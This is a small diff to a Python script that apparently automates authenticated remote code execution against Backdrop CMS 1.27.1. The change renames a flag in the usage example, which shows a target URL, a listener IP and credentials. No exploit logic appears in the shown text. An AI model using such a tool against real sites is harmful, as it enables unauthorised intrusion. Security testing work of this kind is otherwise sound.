@@ -14,7 +14,7 @@ shell_name = "trr0r" # Cambiar según las preferencias
 
 def get_args():
 
-    parser = argparse.ArgumentParser(description=colored("🪂 Backdrop CMS 1.27.1 - Automated Authenticated RCE 🪂\n\n\tej: python3 autoDropRCE.py -t http://backdrop-example.com -i 172.17.0.1 -u trr0r -p trr0r", 'blue', attrs=["bold"]), formatter_class=StructuredFormatter)
+    parser = argparse.ArgumentParser(description=colored("🪂 Backdrop CMS 1.27.1 - Automated Authenticated RCE 🪂\n\n\tej: python3 autoDropRCE.py -t http://backdrop-example.com -h-ip 172.17.0.1 -u trr0r -p trr0r", 'blue', attrs=["bold"]), formatter_class=StructuredFormatter)
     # Required arguements:
 
     # Target URL
